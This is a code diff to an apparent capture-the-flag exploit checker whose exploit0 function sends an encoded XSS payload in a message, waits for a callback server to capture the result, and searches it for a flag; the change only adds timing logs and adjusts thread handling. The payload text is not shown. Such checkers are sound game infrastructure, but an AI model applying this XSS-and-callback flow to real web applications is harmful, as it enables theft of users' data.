@@ -334,11 +334,15 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, clie
     payload = encode(exploitMessage.format(task.address), target, logger)
     r = await client.post(f"{getUrl(task)}/messages/", json={"recipient": target, "message": payload}, cookies=cookie)
     assert_equals(r.status_code, 200, "exploit failed")
+    start = time.time()
     xss_test(task, logger)
+    logger.debug(f"took {time.time() - start} seconds")
     while not result[0]:
-        time.sleep(0.1)
+        time.sleep(0.01)
+    startShutdown = time.time()
     webServer[0].shutdown()
-    # server_thread.join()
+    logger.debug(f"took {time.time() - startShutdown} seconds to shutdown")
+    server_thread.join()
     logger.debug('Server stopped')
     if flag := searcher.search_flag(result[0]):
         return flag
